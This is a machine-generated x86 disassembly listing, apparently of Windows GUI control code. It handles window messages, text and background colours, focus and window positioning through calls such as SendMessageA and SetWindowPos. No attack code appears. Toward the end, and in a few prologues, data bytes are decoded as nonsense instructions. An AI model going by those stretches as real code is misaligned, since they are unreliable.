movzx edi [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a978c8
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3a978ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_3a98010
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
sub eax 0x5
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
cmp [ ebx + 0x2a4 ] 0x0
je r-xdata
sub eax 0x7e
je r-xdata
mov eax ebx
call sub_3ab03ec
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_3ab4d0c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub eax 0x7f
je r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_3ab6bd4
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
mov edx esi
mov eax ebx
call sub_3ab4c58
test al al
jne r-xdata
movzx edi [ esi + 0x4 ]
cmp di 0xd
je r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_3a88d54
push eax
mov eax [ esi + 0x4 ]
push eax
call SetTextColor
mov eax [ ebx + 0x1a4 ]
call sub_3a89b18
call sub_3a88d54
push eax
mov eax [ esi + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0x1a4 ]
call sub_3a89b74
mov [ esi + 0xc ] eax
cmp [ ebx + 0x240 ] 0x0
je r-xdata
jmp r-xdata
movzx eax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
mov eax ebx
call sub_3a978c8
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
call sub_3a91b8c
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_3a978ec
jmp r-xdata
cmp [ ebx + 0x2a8 ] 0xffffffff
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_3ac463c
mov esi eax
test esi esi
je r-xdata
mov eax esi
call sub_3ad0d70
call sub_3ad105c
test al al
je r-xdata
mov eax esi
call sub_3ad0d70
mov edx ebx
call sub_3ad1094
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x2a8 ] eax
push 0x0
push 0x0
push 0xb04d
mov eax [ ebx + 0x288 ]
push eax
call PostMessageA
jmp r-xdata
sub_3a981a6
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_3a98314
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edx + 0x6 ]
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9831b
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
jmp [ eax * 4 + jump_table_3a981d4 ]
mov eax edi
mov si 0xffe9
call sub_3a6457c
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_3a6457c
jmp r-xdata
mov [ edi + 0x2a5 ] 0x0
mov eax edi
mov si 0xffae
call sub_3a6457c
mov eax edi
mov edx [ eax ]
call [ edx + 0x100 ]
cmp [ edi + 0x2a5 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
inc eax
je r-xdata
mov eax edi
mov si 0xffad
call sub_3a6457c
jmp r-xdata
mov [ edi + 0x2a6 ] 0x1
mov [ edi + 0x2a5 ] 0x1
mov eax edi
call sub_3ab6240
jmp r-xdata
mov [ edi + 0x2a6 ] 0x0
mov [ edi + 0x2a5 ] 0x1
mov eax edi
call sub_3ab6370
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_3ab7c38
push eax
call PostMessageA
cmp [ edi + 0x2a6 ] 0x0
jne r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x284 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_3aafbb8
mov eax edi
mov si 0xffeb
call sub_3a6457c
mov eax edi
mov si 0xffaf
call sub_3a6457c
jmp r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_3ab7c38
push eax
call PostMessageA
jmp r-xdata
sub_3a98368
push esi
push edi
mov esi eax
mov eax esi
call sub_3ab2324
mov edi [ esi + 0x25c ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xe0 ]
sub_3a98390
push ebx
push esi
push edi
mov edi eax
xor ebx ebx
mov eax edi
call sub_3ab7fd8
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
call GetFocus
mov esi eax
cmp esi [ edi + 0x288 ]
je r-xdata
mov bl 0x1
cmp esi [ edi + 0x28c ]
je r-xdata
mov eax edi
call sub_3ab7c38
cmp esi eax
je r-xdata
xor ebx ebx
jmp r-xdata
sub_3a983f0
push ebx
push esi
cmp [ eax + 0x26a ] 0x0
je r-xdata
mov si 0xffb0
call sub_3a6457c
pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
pop esi
pop ebx
retn
sub_3a9841c
push ebx
mov ebx eax
mov eax ebx
call sub_3ab3e5c
push 0x0
mov eax [ ebx + 0x254 ]
push eax
push 0x141
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
xor eax eax
mov [ ebx + 0x288 ] eax
xor eax eax
mov [ ebx + 0x28c ] eax
mov edx 0x1
mov eax 0x5
call sub_3a6dbb4
test al al
je r-xdata
pop ebx
retn
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
push 0x0
mov eax [ ebx + 0x258 ]
push eax
push 0x1701
mov eax ebx
call sub_3ab7c38
push eax
call SendMessageA
sub_3a98490
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x118 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2a4 ] 0x1
xor eax eax
push ebp
push sub_3a98526
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x110 ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x290 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9852d
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2a4 ] 0x0
retn
mov ebx 0x1
sub_3a9852d
push 0x57
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x290 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_3a9854c
push esi
push edi
mov esi eax
mov edi [ esi + 0x284 ]
test edi edi
je r-xdata
mov [ esi + 0x284 ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_3a9857c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a985fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a98602
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x284 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
mov edx eax
mov eax [ ebx + 0x284 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xe4 ]
sub_3a98608
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
mov edx eax
mov eax [ ebx + 0x284 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_3a98640
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_3a6dbb4
test al al
je r-xdata
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
push 0x0
mov eax [ ebx + 0x258 ]
push eax
push 0x1701
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
sub_3a9869c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_3a65720
xor eax eax
push ebp
push sub_3a986e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x284 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a986ec
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a986f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ab29bc
mov eax esi
mov edx [ r-xdata ]
call sub_3a64530
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_3a98718
push ebx
mov ebx eax
mov eax ebx
call sub_3ac0a5c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a64530
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_3a98750
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x250 ] 0x1
xor edx edx
push ebp
push sub_3a987a6
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x250 ] 0x0
retn
sub_3a987b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3ab29f0
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x1b8 ] 0x0
sub_3a98808
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_3ab8850
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
movzx edx [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xdc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xd8 ]
test al al
jne r-xdata
sub_3a98860
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_3a98884
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_3ab4d0c
mov eax ebx
mov si 0xffb3
call sub_3a6457c
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x250 ] 0x1
mov eax ebx
call sub_3ab7c38
push eax
call SetFocus
mov [ ebx + 0x250 ] 0x0
mov eax ebx
mov si 0xffb3
call sub_3a6457c
test al al
je r-xdata
cmp [ ebx + 0x250 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_3a988fc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
call sub_3abdd24
mov edi eax
mov eax ebx
call sub_3abe5d0
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x30 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_3ab7c38
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_3abdf2c
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_3aac8d8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
push 0x5
call GetStockObject
mov [ esi + 0xc ] eax
jmp r-xdata
sub_3a98960
push ebx
push esi
mov esi edx
mov ebx eax
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_3ab5ed8
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_3a9898c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ab3d30
cmp [ ebx + 0x251 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_3a989c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a987b4
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_3aaf278
mov edx 0x19
mov eax esi
call sub_3aaf2ac
mov dl 0x1
mov eax esi
call sub_3ab7f08
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a98a28
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_3ac463c
test eax eax
je r-xdata
mov eax ebx
call sub_3ab16b0
pop ebx
retn
mov edx [ ebx + 0x25c ]
mov [ eax + 0x294 ] edx
sub_3a98a54
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_3ab7fd8
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_3ab7c38
push eax
call __imp_SendMessageA
push 0xfffffff0
mov eax ebp
call sub_3ab7c38
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_3a98aa8
push ebx
mov ebx eax
mov [ ebx + 0x258 ] dl
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_3ac463c
test eax eax
je r-xdata
mov edx [ eax + 0x268 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_3ab0e78
sub_3a98ae0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3a9898c
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_3ab3c5c
movzx eax [ ebx + 0x258 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_3a98b4c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x25a ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_3ab7084
cmp [ ebx + 0x259 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_3ac44fc
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb6
call sub_3a6457c
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_3a6457c
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3a98bb9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a98c32
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_3aafb88
mov edx [ ebp - 0x4 ]
movzx eax [ edi + 0x4 ]
call sub_3ac4588
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_3ab708c
mov eax ebx
mov si 0xffb6
call sub_3a6457c
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_3a6457c
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a98c39
sub_3a98c40
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
movzx eax [ ebx + 0x258 ]
mov [ ebx + 0x25a ] al
cmp ebx edi
sete al
mov [ ebx + 0x25a ] al
jmp r-xdata
movzx edx [ ebx + 0x25a ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov edx esi
mov eax ebx
call sub_3ab7094
pop edi
pop esi
pop ebx
retn
sub_3a98c94
push ebx
push esi
mov esi edx
mov ebx eax
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_3a98cc0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
call sub_3abdd24
mov esi eax
mov eax esi
call sub_3abde2c
test al al
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x30 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_3ab7c38
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax esi
call sub_3abdf2c
mov edx [ edi + 0x4 ]
mov eax ebx
call sub_3aac8d8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
sub_3a98d24
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a987b4
mov edx 0x61
mov eax esi
call sub_3aaf278
mov edx 0x11
mov eax esi
call sub_3aaf2ac
mov dl 0x1
mov eax esi
call sub_3ab7f08
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x258 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a98d90
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc7
call sub_3a6457c
test al al
jne r-xdata
cmp [ ebx + 0x258 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_3a98dbc
movzx edx [ eax + 0x25a ]
sub dl 0x1
jb r-xdata
cmp [ eax + 0x259 ] 0x0
je r-xdata
je r-xdata
mov dl 0x1
call sub_3a98e44
retn
mov dl 0x2
call sub_3a98e44
jmp r-xdata
xor edx edx
call sub_3a98e44
retn
dec dl
je r-xdata
retn
mov dl 0x1
call sub_3a98e44
jmp r-xdata
sub_3a98e44
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x25a ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x25a ] dl
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
cmp [ ebx + 0x250 ] 0x0
jne r-xdata
push 0x0
movzx eax [ ebx + 0x25a ]
push eax
push 0xf1
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
mov eax ebx
mov si 0xffeb
call sub_3a6457c
sub_3a98e94
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_3a9898c
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_3ab3c5c
mov eax ebx
mov si 0xffc7
call sub_3a6457c
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
movzx edx [ ebx + 0x258 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x5
or eax edx
mov [ edi + 0x4 ] eax
and [ edi + 0x24 ] 0xfffffffc
pop edi
pop esi
pop ebx
retn
sub_3a98eeb
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5099173d ]
add [ eax ] eax
push 0x0
movzx eax [ ebx + 0x25a ]
push eax
push 0xf1
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
pop ebx
retn
sub_3a98f34
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a98fc2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_3aafb88
mov edx [ ebp - 0x4 ]
movzx eax [ edi + 0x4 ]
call sub_3ac4588
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_3ab708c
mov eax ebx
mov si 0xffb6
call sub_3a6457c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
mov eax ebx
mov si 0xffb3
call sub_3a6457c
test al al
je r-xdata
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a98fc9
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a98fe0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3a99011
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a99018
retn
mov eax [ rw-data ]
call sub_3a64380
sub_3a9902c
push esi
push edi
mov edi eax
jmp r-xdata
movzx esi [ edx ]
test si si
je r-xdata
mov [ eax ] 0x0
mov eax edi
pop edi
pop esi
retn
test ecx ecx
ja r-xdata
mov [ eax ] si
add edx 0x2
add eax 0x2
dec ecx
sub_3a99054
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_3a65bec
mov edx eax
mov ecx edi
mov eax ebx
call sub_3a9902c
pop edi
pop esi
pop ebx
retn
sub_3a99074
test eax eax
je r-xdata
xor eax eax
retn
test edx edx
je r-xdata
dec ecx
jl r-xdata
push esi
push ebx
mov esi [ edx - 0x4 ]
mov ebx [ eax - 0x4 ]
sub esi ecx
add edx ecx
cmp esi ebx
jl r-xdata
pop ebx
pop esi
test ebx ebx
jle r-xdata
add esp 0xfffffff4
add ebx 0xffffffff
add esi edx
add edx ebx
mov [ esp + 0x8 ] esi
add eax ebx
sub ecx edx
neg ebx
mov [ esp + 0x4 ] ecx
mov [ esp ] ebx
movzx ecx [ eax ]
add edx 0xffffffff
cmp cl [ edx + 0x1 ]
je r-xdata
mov eax [ esp + 0x4 ]
add edx 0x2
cmp edx [ esp + 0x8 ]
ja r-xdata
movzx ebx [ eax + esi ]
cmp bx [ edx + esi + 0x1 ]
jne r-xdata
mov esi [ esp ]
test esi esi
je r-xdata
add edx 0x4
cmp edx [ esp + 0x8 ]
jb r-xdata
add esp 0xc
add esp 0xc
add eax edx
pop ebx
pop esi
retn
cmp esi 0xfffffffe
jge r-xdata
cmp cl [ edx - 0x2 ]
je r-xdata
add edx 0xfffffffe
cmp edx [ esp + 0x8 ]
jb r-xdata
movzx ebx [ eax + esi + 0x2 ]
cmp bx [ edx + esi + 0x3 ]
jne r-xdata
add edx 0xfffffffe
cmp cl [ edx - 0x1 ]
jne r-xdata
cmp cl [ edx ]
je r-xdata
add esi 0x4
jl r-xdata
add edx 0x1
sub_3a99e27
dec [ edx ]
add [ eax ] al
add [ ebx + 0x6c ] ah
push edi
bound eax [ gs : edx + 0x6c ]
popad
arpl [ ebx ] bp
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_3a99e91
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a99e98
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0x8a
mov edx [ r-xdata ]
call sub_3a65e38
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_3a99e9c
call sub_3ad483f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3a99f ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx * 4 - 0x57 ] bh
add ecx [ edx - 0x4ffc5661 ]
add [ eax ] eax
add ah bh
mov bh 0xaa
add esi eax
cmp eax 0x45d403a8
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add esp [ edx + edx ]
stosd [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add edx [ eax - 0x4a ]
test eax 0xab235c03
add esp [ eax ]
adc eax 0xaad003ab
cmpsd [ esi ] [ edi ]
add esp [ ebx ]
stosd [ edi ]
add ebp [ esi + ebp * 8 - 0x11e7fc56 ]
stosb [ edi ]
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
mov eax 0x4803a9b5
or al 0xab
add eax [ esp + edi * 4 - 0x57 ]
add edx [ ecx - 0x1397fc55 ]
stosb [ edi ]
add eax [ eax - 0x1bfc550b ]
hlt
sub_3a9a7e8
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0xa7f49072
test eax 0x54060703
push esp
imul ebp [ ebp + 0x65 ] 0xa9a7b072
add ebx [ eax ]
mov [ edi + 0x8000503 ] fs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
inc ebx
je r-xdata
jl r-xdata
test eax 0x3
add [ eax ] al
add [ eax ] al
add [ eax - 0x33fc5657 ] ah
test eax 0x26c03a9
add [ eax ] al
and [ ecx + 0x3df003aa ] bh
test al 0x3
aam 0x45
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add ebp [ edx + edx * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
test eax 0x3a9
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xffffffffcc03a9a9 ]
insb
jae r-xdata
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
je r-xdata
cmpsb [ esi ] [ edi ]
add esi [ eax ]
add [ eax ] al
[ eax + 0x103a9c2 ]
stosd [ edi ]
add ecx [ edx + edi * 2 ]
stosd [ edi ]
add ebp [ eax - 0x53fc5515 ]
jmp r-xdata
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add bh bh
cwde
retn 0x3a9
add [ eax ] al
adc [ esi + 0x4003 ] ah
[ eax + 0x103a9c2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add ebx [ eax ]
inc ebx
